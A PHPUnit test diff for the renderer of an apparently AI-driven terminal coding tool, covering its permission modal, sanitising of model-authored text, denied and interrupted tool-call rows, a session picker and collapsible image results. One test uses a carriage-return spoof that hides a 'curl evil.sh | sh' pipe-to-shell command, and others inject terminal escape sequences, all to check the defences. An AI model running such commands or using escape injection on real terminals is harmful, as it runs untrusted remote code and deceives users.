+        $this->assertStringContainsString('always allow Bash(git status *) (this session)', $out);
+        // `p` is the same scope with a future: it saves to config.
+        $this->assertStringContainsString('always allow Bash(git status *) (save to config)', $out);
+        // Wrapped across two rows at this width; read as one line.
+        $flat = (string) preg_replace('/\s+/u', ' ', str_replace('│', ' ', Ansi::strip($out)));
+        $this->assertStringContainsString('(this session) p always allow Bash(git status *) (save to config) e edit what "always" allows', $flat, '`p` saves what `a` remembers, `e` edits it first');
+        $this->assertStringContainsString('reject', $out);
+        $this->assertStringContainsString('n / Esc', $out);
+
+        // A prompt nothing can remember (no gate question behind it) offers
+        // no `a` at all, and says why it is asked every time.
+        $unrememberable = (string) preg_replace('/\s+/u', ' ', str_replace('│', ' ', Ansi::strip(Renderer::render($this->chatAwaitingPermission()))));
+        $this->assertStringContainsString('This always asks (', $unrememberable);
+        $this->assertStringNotContainsString('always allow', $unrememberable);
+        $this->assertStringContainsString('allow once', $unrememberable);
+    }
+
+    /**
+     * A prompt disarmed by a stray keystroke looks identical to a live one, so
+     * without this the fix would trade a silent grant for a silently dead
+     * modal: the user presses `y`, nothing happens, and nothing on screen says
+     * why or what to do about it.
+     *
+     * Both halves are asserted — the cue, by the same constant the renderer
+     * paints rather than a hand-copied literal, and the way back.
+     */
+    public function testADisarmedPromptSaysSoAndSaysHowToGetBack(): void
+    {
+        [$disarmed] = $this->chatAwaitingPermission()->update(new KeyMsg(KeyType::Char, '/'));
+        $this->assertSame(PermissionPromptStage::Disarmed, $disarmed->permissionStage());
+
+        $out = Renderer::render($disarmed);
+
+        $this->assertStringContainsString('permission required', $out, 'the question is still on screen');
+        $this->assertStringContainsString(Lang::t(Renderer::PERMISSION_DISARMED_NOTICE), $out);
+        $this->assertStringContainsString('Enter', $out, 'and the key that makes the answers live again');
+        $this->assertStringContainsString('listen for an answer again', $out);
+        $this->assertStringNotContainsString(
+            'allow once',
+            $out,
+            'and it must NOT keep advertising keys that now do nothing — that is the promise this state '
+            . 'exists to stop making',
+        );
+    }
+
+    /**
+     * `a` answers at once — there is no confirm box any more — and `e`'s
+     * scope editor REPLACES the question's own keys rather than being added
+     * under them: while it is up, letters type the scope, so a modal still
+     * advertising `y` would promise an answer the key no longer gives.
+     */
+    public function testTheScopeEditorIsRenderedWithItsOwnLeadAndKeys(): void
+    {
+        [$answered] = $this->chatAwaitingGateAsk()->update(new KeyMsg(KeyType::Char, 'a'));
+        $this->assertNull($answered->pendingPermission(), '`a` answers without a second box');
+
+        [$editing] = $this->chatAwaitingGateAsk()->update(new KeyMsg(KeyType::Char, 'e'));
+        $this->assertSame(PermissionPromptStage::EditingScope, $editing->permissionStage());
+
+        $out = (string) preg_replace('/\s+/u', ' ', str_replace('│', ' ', Ansi::strip(Renderer::render($editing))));
+
+        $this->assertStringContainsString('Always allow (Bash): git status *', $out);
+        $this->assertStringContainsString('remember this for the session and allow the call', $out);
+        $this->assertStringContainsString('back to the question', $out);
+        $this->assertStringNotContainsString(
+            'allow once',
+            $out,
+            'the base prompt\'s keys are gone: letters type the scope in this stage',
+        );
+    }
+
+    /** Nothing is composited while no prompt is blocking the turn. */
+    public function testNoPermissionModalWhenNoPromptIsPending(): void
+    {
+        $out = Renderer::render($this->sizedChat([Message::user('hi')]));
+
+        $this->assertStringNotContainsString('permission required', $out);
+    }
+
+    /**
+     * The prompt owns the keyboard in Chat::update(), so it must own the single
+     * overlay slot too - a palette drawn on top of a prompt would advertise
+     * keys that no longer do anything.
+     */
+    public function testPermissionModalTakesTheOverlaySlotFromAnOpenPalette(): void
+    {
+        [$opened] = $this->sizedChat([])->update(new KeyMsg(KeyType::Char, 'p', ctrl: true));
+        $this->assertStringContainsString('New session', Renderer::render($opened));
+
+        [$blocked] = $opened->update(new \SugarCraft\Code\PermissionRequestMsg(
+            Message::assistant(''),
+            new \SugarCraft\Code\ToolCall('Bash', [], 'call_1'),
+            'Really?',
+        ));
+        $out = Renderer::render($blocked);
+
+        $this->assertStringContainsString('permission required', $out);
+        $this->assertStringNotContainsString('New session', $out);
+    }
+
+    /**
+     * A hook may hand back an arbitrarily long message; the modal must clip it
+     * rather than let its own answer keys get pushed off the viewport.
+     */
+    public function testLongPromptIsClippedWithACountOfTheHiddenLines(): void
+    {
+        $out = Renderer::render($this->chatAwaitingPermission(implode("\n", array_fill(0, 30, 'why not'))));
+
+        $this->assertStringContainsString('more lines', $out);
+        $this->assertStringContainsString('allow once', $out);
+    }
+
+    /**
+     * No line of the modal may exceed its declared width: an over-wide row
+     * inside a bordered box breaks the border and the viewport row accounting
+     * render() does around it.
+     */
+    public function testLongUnbrokenArgumentTextIsWrappedNotOverflowed(): void
+    {
+        $blocked = $this->chatAwaitingPermission(
+            str_repeat('averylongunbrokentoken', 12),
+            ['command' => str_repeat('x', 400)],
+        );
+
+        foreach ($this->visibleLines(Renderer::render($blocked)) as $line) {
+            $this->assertLessThanOrEqual(80, mb_strlen($line));
+        }
+    }
+
+    /**
+     * Veil clips the overlay to the background's widest line, and a paused turn
+     * renders a narrow transcript - so without widening the backdrop first the
+     * modal loses its entire right-hand border exactly when it is shown.
+     */
+    public function testModalKeepsItsRightBorderOverANarrowTranscript(): void
+    {
+        $out = Renderer::render($this->chatAwaitingPermission());
+
+        $this->assertStringContainsString('╮', $out);
+        $this->assertStringContainsString('╯', $out);
+    }
+
+    /** The modal never renders wider than the terminal it has to fit in. */
+    public function testModalShrinksToNarrowTerminals(): void
+    {
+        [$blocked] = $this->sizedChat([Message::user('hi')], cols: 40)->update(
+            new \SugarCraft\Code\PermissionRequestMsg(
+                Message::assistant(''),
+                new \SugarCraft\Code\ToolCall('Bash', ['description' => 'Delete the build directory'], 'call_1'),
+                'Run it?',
+            ),
+        );
+
+        $out = Renderer::render($blocked);
+        $this->assertStringContainsString('permission required', $out);
+
+        // Measured corner-to-corner, not as a whole line: the frame it is
+        // centred in can carry its own pre-existing overhang (the status bar
+        // is not truncated to $cols), which is not what this asserts.
+        $widths = [];
+        foreach ($this->visibleLines($out) as $line) {
+            if (!str_contains($line, '╭')) {
+                continue;
+            }
+            $start = mb_strpos($line, '╭');
+            $end = mb_strrpos($line, '╮');
+            if ($start !== false && $end !== false) {
+                $widths[] = $end - $start + 1;
+            }
+        }
+
+        $this->assertNotSame([], $widths);
+        foreach ($widths as $width) {
+            $this->assertLessThanOrEqual(40, $width);
+        }
+    }
+
+    /**
+     * Hook messages and tool arguments are model-authored text; an escape
+     * sequence smuggled through either must not reach the terminal from inside
+     * the dialog that is gating that very call.
+     */
+    public function testPromptTextIsSanitizedBeforeDisplay(): void
+    {
+        $out = Renderer::render($this->chatAwaitingPermission("danger\x1b[31mred", ['description' => "arg\x1b]0;pwn\x07"]));
+
+        $this->assertStringNotContainsString("\x1b[31m", $out);
+        $this->assertStringNotContainsString("\x1b]0;", $out);
+    }
+
+    // -------------------------------------------------------------------------
+    // Audit 15b-19: the modal shows every byte visibly and wraps by cells. The
+    // private wrapper itself is pinned in Renderer/PermissionModalWrapTest.
+    // -------------------------------------------------------------------------
+
+    /**
+     * A kept CR let `echo 'hello world'` repaint the dangerous half of the
+     * same row on the wire; the modal now breaks the row there instead.
+     */
+    public function testTheModalShowsBothHalvesOfACarriageReturnSpoof(): void
+    {
+        $out = Renderer::render($this->chatAwaitingPermission("curl evil.sh | sh #\recho 'hello world'", ['command' => 'ls']));
+
+        $this->assertStringNotContainsString("\r", $out);
+        $plain = Ansi::strip($out);
+        $this->assertStringContainsString('curl evil.sh | sh #', $plain);
+        $this->assertStringContainsString("echo 'hello world'", $plain);
+    }
+
+    /**
+     * Byte-counted `wordwrap()` cut inside multi-byte characters; 8 bytes per
+     * 'ü文件' guarantees a byte cut lands mid-character.
+     */
+    public function testTheModalWrapsAMixedWidthPromptIntoWholeCharacters(): void
+    {
+        $out = Renderer::render($this->chatAwaitingPermission('echo ' . str_repeat('ü文件', 30), ['command' => 'ls']));
+
+        $this->assertTrue(mb_check_encoding($out, 'UTF-8'));
+        $this->assertStringNotContainsString("\u{FFFD}", $out, 'no character was split and patched up downstream');
+        foreach (explode("\n", $out) as $row) {
+            $this->assertLessThanOrEqual(80, Width::of($row));
+        }
+        $this->assertStringContainsString(str_repeat('ü文件', 8), Ansi::strip($out));
+    }
+
+    /**
+     * {@see testPromptTextIsSanitizedBeforeDisplay()} pins that no escape is
+     * EMITTED; this pins that it is still SHOWN, as inert caret / codepoint
+     * text, rather than silently stripped from what the user approves.
+     */
+    public function testTheModalShowsAPromptEscapeAsVisibleText(): void
+    {
+        $out = Renderer::render($this->chatAwaitingPermission("wipe \x1b[2J\u{9b}3J now", ['command' => 'ls']));
+
+        $this->assertStringNotContainsString("\x1b[2J", $out);
+        $this->assertSame(0, preg_match('/\xC2[\x80-\x9F]/', $out));
+        $this->assertStringContainsString('wipe ^[[2J<U+009B>3J now', Ansi::strip($out));
+    }
+
+    /**
+     * The title took a bare `Sanitize::untrusted()` of the tool name: CR and
+     * zone sentinels kept, an LF free to break the row. It is now one row
+     * with every control spelled out.
+     */
+    public function testTheModalTitleIsOneRowShowingEveryControlInTheToolName(): void
+    {
+        $sentinel = \SugarCraft\Core\Util\Sanitize::ZONE_SENTINEL_OPEN;
+        $out = Renderer::render($this->chatAwaitingPermission('ok?', [], "Ba\rsh\x1b[2J{$sentinel}x\ny\u{9b}"));
+
+        $this->assertStringNotContainsString("\r", $out);
+        $this->assertStringNotContainsString("\x1b[2J", $out);
+        $this->assertStringNotContainsString($sentinel, $out);
+        $this->assertSame(0, preg_match('/\xC2[\x80-\x9F]/', $out));
+
+        $titleRows = array_values(array_filter(
+            explode("\n", Ansi::strip($out)),
+            static fn(string $row): bool => str_contains($row, '🔒'),
+        ));
+        $this->assertCount(1, $titleRows);
+        $this->assertStringContainsString('🔒 Ba^Msh^[[2J<U+E000>x^Jy<U+009B>', $titleRows[0]);
+    }
+
+    /** An over-long tool name is cut to the modal, and says that it was cut. */
+    public function testAnOverlongModalTitleIsCutWithAMarker(): void
+    {
+        $out = Renderer::render($this->chatAwaitingPermission('ok?', [], str_repeat('T', 200)));
+
+        $titleRows = array_values(array_filter(
+            explode("\n", Ansi::strip($out)),
+            static fn(string $row): bool => str_contains($row, '🔒'),
+        ));
+        $this->assertCount(1, $titleRows);
+        $this->assertStringContainsString('T…', $titleRows[0]);
+        $this->assertLessThanOrEqual(80, Width::of($titleRows[0]));
+    }
+
+    // =========================================================================
+    // crush_feat.md §1 E7: denied / interrupted tool-call visual states
+    // =========================================================================
+
+    /** One tool-result turn, so a whole frame can be rendered around it. */
+    private function resultMessage(\SugarCraft\Code\ToolResult $result): Message
+    {
+        return Message::assistant('')->withToolResults([$result]);
+    }
+
+    /**
+     * The step-defining regression: a refused call used to render with the
+     * exact same "✗ error" row as a call that ran and failed, so nothing on
+     * screen distinguished "the tool blew up" from "the tool never ran". It
+     * now takes the struck-through row §1 E7 asks for - a distinct visual
+     * state, not just a colour.
+     */
+    public function testDeniedToolCallRowIsStruckThrough(): void
+    {
+        $chat = $this->sizedChat([$this->resultMessage(
+            // Built the way a refusing party builds one (audit F-P8): the kind
+            // is structural, and it is what the row's struck-through state reads.
+            \SugarCraft\Code\ToolResult::denied(
+                'bash',
+                \SugarCraft\Code\Permissions\DenialKind::Refused,
+                'bash was not run.',
+                'call_1',
+            ),
+        )]);
+        $theme = $chat->theme();
+
+        $out = Renderer::render($chat);
+
+        $this->assertStringContainsString(
+            Style::new()->foreground($theme->systemLabel)->strikethrough()->render('🔧 tool: bash'),
+            $out,
+        );
+        $this->assertStringContainsString(
+            Style::new()->foreground($theme->systemLabel)->bold()->strikethrough()->render('⊘ denied'),
+            $out,
+        );
+        $this->assertStringNotContainsString('✗ error', $out);
+        // The reason is the point of the row, so it stays readable.
+        $this->assertStringContainsString('Permission denied: bash was not run.', $out);
+    }
+
+    /**
+     * A restart-orphaned call ({@see Chat::reviveCheckpointMessage()}) is also
+     * "never ran", so it takes the same strikethrough with its own word.
+     */
+    public function testInterruptedToolCallRowIsStruckThroughAndNamedDistinctly(): void
+    {
+        $chat = $this->sizedChat([$this->resultMessage(
+            \SugarCraft\Code\ToolResult::error('bash', Chat::INTERRUPTED_TOOL_CALL, 'call_1'),
+        )]);
+        $theme = $chat->theme();
+
+        $out = Renderer::render($chat);
+
+        $this->assertStringContainsString(
+            Style::new()->foreground($theme->systemLabel)->bold()->strikethrough()->render('⊘ interrupted'),
+            $out,
+        );
+        $this->assertStringNotContainsString('⊘ denied', $out);
+    }
+
+    /**
+     * The counterpart guard: a call that genuinely ran and failed keeps the
+     * plain error row, un-struck, or the new state would mean nothing.
+     */
+    public function testAGenuineFailureKeepsThePlainErrorRow(): void
+    {
+        $chat = $this->sizedChat([$this->resultMessage(
+            \SugarCraft\Code\ToolResult::error('bash', 'exit status 1', 'call_1'),
+        )]);
+        $theme = $chat->theme();
+
+        $out = Renderer::render($chat);
+
+        $this->assertStringContainsString(
+            Style::new()->foreground($theme->systemLabel)->render('🔧 tool: bash'),
+            $out,
+        );
+        $this->assertStringContainsString('✗ error', $out);
+        $this->assertStringNotContainsString('⊘', $out);
+    }
+
+    /**
+     * A successful call is untouched by any of this - no strikethrough, no
+     * refusal glyph.
+     */
+    public function testSuccessfulToolCallIsUnaffected(): void
+    {
+        $chat = $this->sizedChat([$this->resultMessage(
+            \SugarCraft\Code\ToolResult::ok('bash', 'total 0', 'call_1'),
+        )]);
+
+        $out = Renderer::render($chat);
+
+        $this->assertStringContainsString('✓ ok', $out);
+        $this->assertStringNotContainsString('⊘', $out);
+    }
+
+    /**
+     * The new glyph must stay OUT of the Unicode private-use block: {@see
+     * Renderer::maskImageMarkers()} masks U+E000-U+F8FF out of the copy the
+     * mouse {@see \SugarCraft\Mouse\Scanner} reads, so a PUA glyph here would
+     * silently shift click zones.
+     */
+    public function testTheRefusalGlyphIsNotInThePrivateUseBlock(): void
+    {
+        $code = mb_ord('⊘');
+
+        $this->assertIsInt($code);
+        $this->assertTrue($code < 0xE000 || $code > 0xF8FF, 'refusal glyph collides with the marker block');
+    }
+
+    // ---------------------------------------------------------------
+    // Live session picker overlay (crush_feat.md section 5 E8)
+    // ---------------------------------------------------------------
+
+    private function pickerChat(int $cols = 100): Chat
+    {
+        $store = new SessionStore(':memory:');
+        $store->createSession('sess-a', 'candy-code', 'test-model', null, 'Alpha');
+        $store->createSession('sess-b', 'candy-code', 'test-model', null, 'Beta');
+
+        $chat = new Chat(
+            history: [Message::user('hello')],
+            sessionStore: $store,
+            currentSessionId: 'sess-a',
+            rows: 24,
+            cols: $cols,
+        );
+
+        [$opened] = $chat->update(new KeyMsg(KeyType::Char, 'r', ctrl: true));
+        self::assertNotNull($opened->sessionPicker());
+
+        return $opened;
+    }
+
+    public function testOpenSessionPickerIsCompositedOverTheFrame(): void
+    {
+        $out = (string) Renderer::render($this->pickerChat());
+
+        $this->assertStringContainsString('session picker', $out);
+        $this->assertStringContainsString('Alpha', $out);
+        $this->assertStringContainsString('Beta', $out);
+        $this->assertStringContainsString('esc close', $out);
+    }
+
+    /**
+     * The picker is the widest overlay the renderer composites, so it is the
+     * one that exposes both halves of the width budget: its own
+     * border + padding(0, 1) wraps AROUND the width it is handed, and Veil
+     * centres it against a backdrop still measured WITH its zone sentinels.
+     * Get either wrong and a row runs past the terminal, which the diff
+     * renderer (one logical line per physical row) turns into the
+     * absolute-cursorTo row collision that Renderer::render()'s tail clip
+     * exists to prevent.
+     *
+     * @dataProvider pickerTerminalWidths
+     */
+    public function testOpenSessionPickerNeverPaintsPastTheTerminalWidth(int $cols): void
+    {
+        $chat = $this->pickerChat($cols);
+
+        $out = (string) Renderer::render($chat);
+
+        foreach (explode("\n", $out) as $index => $line) {
+            $this->assertLessThanOrEqual(
+                $cols,
+                Width::string($line),
+                "line {$index} overflows a {$cols}-column terminal",
+            );
+        }
+    }
+
+    /** @return array<string, array{int}> */
+    public static function pickerTerminalWidths(): array
+    {
+        return [
+            '70 columns' => [70],
+            '76 columns' => [76],
+            '80x24 canonical' => [80],
+            '100 columns' => [100],
+        ];
+    }
+
+    public function testClosedSessionPickerCompositesNothing(): void
+    {
+        [$closed] = $this->pickerChat()->update(new KeyMsg(KeyType::Escape, ''));
+
+        $out = (string) Renderer::render($closed);
+
+        $this->assertStringNotContainsString('session picker', $out);
+    }
+
+    /**
+     * The user-reported regression behind crush_feat.md §3 E2: expanding a
+     * finished tool call showed its OUTPUT but the row never said which
+     * command produced it. Against the old renderer this fails - the finished
+     * row was `🔧 tool: bash ✓ ok` and the `ls -la` only ever appeared on the
+     * transient running placeholder.
+     */
+    public function testFinishedToolRowShowsTheCommandThatRan(): void
+    {
+        $chat = $this->sizedChat([$this->resultMessage(
+            \SugarCraft\Code\ToolResult::ok('bash', 'a.txt', 'call_1')
+                ->withDescription('bash(command: "ls -la")'),
+        )]);
+
+        $out = Renderer::render($chat);
+
+        $this->assertStringContainsString('tool: bash', $out);
+        $this->assertStringContainsString('ls -la', $out);
+    }
+
+    /**
+     * The tail is drawn AFTER the status marker on purpose: markToolCalls()
+     * locates the clickable row by str_contains() of the label it recorded,
+     * so the un-suffixed label has to stay a verbatim prefix of the row or
+     * click-to-expand would start missing rows.
+     */
+    public function testCommandTailIsAppendedAfterTheStatusMarkerNotBeforeIt(): void
+    {
+        $chat = $this->sizedChat([$this->resultMessage(
+            \SugarCraft\Code\ToolResult::ok('bash', 'a.txt', 'call_1')
+                ->withDescription('bash(command: "ls -la")'),
+        )]);
+        $theme = $chat->theme();
+
+        $out = Renderer::render($chat);
+        $label = Style::new()->foreground($theme->systemLabel)->render('🔧 tool: bash')
+            . ' ' . Style::new()->foreground($theme->assistantLabel)->bold()->render('✓ ok');
+
+        $this->assertStringContainsString($label, $out);
+        $this->assertStringContainsString(
+            $label . Style::new()->foreground($theme->systemLabel)->render(' — bash(command: "ls -la")'),
+            $out,
+        );
+    }
+
+    /** A result with no known call keeps exactly the row it always had. */
+    public function testToolRowWithoutADescriptionIsUnchanged(): void
+    {
+        $chat = $this->sizedChat([$this->resultMessage(
+            \SugarCraft\Code\ToolResult::ok('bash', 'a.txt', 'call_1'),
+        )]);
+        $theme = $chat->theme();
+
+        $out = Renderer::render($chat);
+
+        $this->assertStringContainsString(
+            Style::new()->foreground($theme->systemLabel)->render('🔧 tool: bash')
+                . ' ' . Style::new()->foreground($theme->assistantLabel)->bold()->render('✓ ok'),
+            $out,
+        );
+        $this->assertStringNotContainsString('—', $out);
+    }
+
+    /**
+     * The tail is model-authored text on a row sugar-core repaints by
+     * absolute position, so it must never push the row past the terminal.
+     */
+    public function testCommandTailIsTruncatedToTheTerminalWidth(): void
+    {
+        $cols = 60;
+        $chat = $this->sizedChat(
+            [$this->resultMessage(
+                \SugarCraft\Code\ToolResult::ok('bash', 'done', 'call_1')
+                    ->withDescription('bash(command: "' . str_repeat('very-long-argument ', 20) . '")'),
+            )],
+            $cols,
+        );
+
+        $out = Renderer::render($chat);
+
+        $rows = array_values(array_filter(
+            explode("\n", $out),
+            static fn(string $line): bool => str_contains($line, 'tool: bash'),
+        ));
+
+        $this->assertCount(1, $rows, 'the tail must stay on the one row it belongs to');
+        $this->assertLessThanOrEqual($cols, Width::string($rows[0]));
+    }
+
+    /**
+     * Raw ESC in a model-authored description would forge SGR straight onto
+     * the terminal wire, exactly as the rest of this renderer's untrusted
+     * strings are guarded against.
+     */
+    public function testCommandTailIsScrubbedOfControlBytes(): void
+    {
+        $chat = $this->sizedChat([$this->resultMessage(
+            \SugarCraft\Code\ToolResult::ok('bash', 'done', 'call_1')
+                ->withDescription("bash(command: \"\x1b[31mred\x07\")"),
+        )]);
+
+        $out = Renderer::render($chat);
+
+        $this->assertStringContainsString('red', $out);
+        $this->assertStringNotContainsString("\x1b[31m", $out);
+        $this->assertStringNotContainsString("\x07", $out);
+    }
+
+    /**
+     * A tail so squeezed it could only show a couple of columns of the
+     * command is not worth the status marker's breathing room.
+     */
+    public function testNoTailIsDrawnWhenTheRowHasNoRoomForOne(): void
+    {
+        $chat = $this->sizedChat(
+            [$this->resultMessage(
+                \SugarCraft\Code\ToolResult::ok(str_repeat('n', 40), 'done', 'call_1')
+                    ->withDescription('ls -la'),
+            )],
+            26,
+        );
+
+        $out = Renderer::render($chat);
+
+        $this->assertStringNotContainsString('ls -la', $out);
+    }
+
+    // =========================================================================
+    // Image-bearing tool results: caption + collapse (crush_feat.md §9 E3 read
+    // through §1 E5). User-reported: `/doctor` "shows just a big green box for
+    // output, nothing else, not collapsable or expandable" - the swatch was
+    // painted unconditionally, at up to a full viewport of rows, so it evicted
+    // its own tool row from the tail-clipped transcript AND ignored Ctrl+O.
+    // =========================================================================
+
+    /** A real, decodable PNG — sugar-image refuses anything it cannot decode. */
+    private function pngBytes(int $width = 20, int $height = 10): string
+    {
+        $gd = imagecreatetruecolor($width, $height);
+        imagefilledrectangle($gd, 0, 0, $width - 1, $height - 1, (int) imagecolorallocate($gd, 46, 160, 74));
+        ob_start();
+        imagepng($gd);
+
+        return (string) ob_get_clean();
+    }
+
+    /** The shape `/doctor` produces: a summary string plus a capability swatch. */
+    private function doctorChat(?\SugarCraft\Image\Mosaic $mosaic, ?string $bytes = null, int $rows = 40): Chat
+    {
+        if (!\extension_loaded('gd')) {
+            $this->markTestSkipped('sugar-image decodes images through ext-gd');
+        }
+
+        return new Chat(
+            history: [$this->resultMessage(new \SugarCraft\Code\ToolResult(
+                name: 'doctor',
+                result: 'Detected pixel-graphics protocol: sixel.',
+                id: 'call_img',
+                imageBytes: $bytes ?? $this->pngBytes(),
+                imageProtocol: 'sixel',
+            ))],
+            rows: $rows,
+            cols: 80,
+            mosaic: $mosaic,
+        );
+    }
+
+    /**
+     * The step-defining regression: collapsed, the picture is replaced by a
+     * one-line affordance, and the tool row plus the result's own summary -
+     * the picture's only caption - are both on screen.
+     */
+    public function testCollapsedImageResultShowsItsRowCaptionAndExpandAffordance(): void
+    {
+        $out = Renderer::render($this->doctorChat(\SugarCraft\Image\Mosaic::halfBlock()));
+
+        $this->assertStringContainsString('tool: doctor', $out);
+        $this->assertStringContainsString('Detected pixel-graphics protocol: sixel.', $out);
+        $this->assertStringContainsString('image hidden (ctrl+o)', $out);
+        $this->assertStringNotContainsString('▀', $out, 'a collapsed picture must not be painted at all');
+    }
+
+    /** The affordance answers "how big" and "with what", the swatch's whole point. */
+    public function testCollapsedImageNoticeNamesTheSourceDimensionsAndProtocol(): void
+    {
+        $out = Renderer::render($this->doctorChat(\SugarCraft\Image\Mosaic::halfBlock()));
+
+        $this->assertStringContainsString('20×10 sixel image hidden (ctrl+o)', $out);
+    }
+
+    /**
+     * Ctrl+O (and the click zone that shares its key, §8 E5) now actually
+     * reaches the picture: expanding paints it and drops the affordance.
+     * '▀' re-verified vs sugar-image e5f60c4f6 (CL-3) — opaque fixture,
+     * both-opaque branch, unchanged by the transparency fix.
+     */
+    public function testExpandingAnImageResultPaintsThePictureAndDropsTheAffordance(): void
+    {
+        $chat = $this->doctorChat(\SugarCraft\Image\Mosaic::halfBlock())->toggleToolOutput('call_img');
+
+        $out = Renderer::render($chat);
+
+        $this->assertStringContainsString('▀', $out, 'half-block cells must be visible once expanded');
+        $this->assertStringNotContainsString('image hidden (ctrl+o)', $out);
+        $this->assertStringContainsString('Detected pixel-graphics protocol: sixel.', $out);
+    }
+
+    /** A collapsed picture is never decoded, so it never reaches the image layer. */
+    public function testCollapsedPixelGraphicsImageRegistersNoPlacement(): void
+    {
+        $chat = $this->doctorChat(\SugarCraft\Image\Mosaic::sixel());
+
+        $this->assertSame([], Renderer::renderView($chat)->images);
+        $this->assertNotSame([], Renderer::renderView($chat->toggleToolOutput('call_img'))->images);
+    }
+
+    /**
+     * The reported failure mode itself: a tall source is budgeted the whole
+     * viewport minus two rows, so painting it unconditionally pushed the tool
+     * row - and everything else - off the tail-clipped transcript.
+     */
+    public function testATallImageNoLongerEvictsItsOwnToolRow(): void
+    {
+        $out = Renderer::render($this->doctorChat(\SugarCraft\Image\Mosaic::halfBlock(), $this->pngBytes(16, 1600), 12));
+
+        $this->assertStringContainsString('tool: doctor', $out);
+        $this->assertStringContainsString('image hidden (ctrl+o)', $out);
+    }
+
+    /**
+     * With no probed protocol expanding could only ever reveal nothing, so the
+     * affordance would be a promise the renderer cannot keep - the caption
+     * still carries the result.
+     */
+    public function testImageResultWithoutAMosaicOffersNoExpandAffordance(): void
+    {
+        $out = Renderer::render($this->doctorChat(null));
+
+        $this->assertStringContainsString('tool: doctor', $out);
+        $this->assertStringContainsString('Detected pixel-graphics protocol: sixel.', $out);
+        $this->assertStringNotContainsString('image hidden (ctrl+o)', $out);
+    }
+
+    /** Unreadable bytes cost the dimensions, not the row. */
+    public function testCollapsedImageNoticeOmitsDimensionsItCannotRead(): void
+    {
+        $out = Renderer::render($this->doctorChat(\SugarCraft\Image\Mosaic::halfBlock(), 'definitely-not-a-png'));
+
+        $this->assertStringContainsString('sixel image hidden (ctrl+o)', $out);
+        $this->assertStringNotContainsString('×', $out);
+    }
+
+    /** A text-only success keeps §1 E5's hide-the-body policy untouched. */
+    public function testTextOnlySuccessBodyIsStillHiddenWhenCollapsed(): void
+    {
+        $chat = $this->sizedChat([$this->resultMessage(
+            \SugarCraft\Code\ToolResult::ok('grep', "alpha\nbeta", 'call_1'),
+        )]);
+
+        $out = Renderer::render($chat);
+
+        $this->assertStringNotContainsString('alpha', $out);
+        $this->assertStringContainsString('2 lines hidden (ctrl+o)', $out);
+    }
+}
